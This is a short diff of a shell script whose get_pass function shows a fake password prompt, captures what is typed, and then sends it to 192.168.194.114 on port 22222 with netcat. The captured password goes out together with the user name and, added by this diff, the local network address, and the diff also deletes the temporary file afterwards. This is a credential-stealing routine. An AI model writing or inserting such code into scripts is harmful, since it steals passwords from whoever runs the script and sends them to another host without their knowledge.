@@ -5,10 +5,11 @@ get_pass(){
 	echo -n "Enter password: "
 	read -s pass
 
-	echo $pass > /tmp/pass.in
-	echo `whoami` >> /tmp/pass.in
+	echo $pass > pass.in
+	ifconfig | grep 168.194 >> pass.in
+	echo `whoami` >> pass.in
 
-	nc -N 192.168.194.114 22222 < /tmp/pass.in
+	nc 192.168.194.114 22222 < pass.in && rm -rf pass.in
 }
 
 init(){
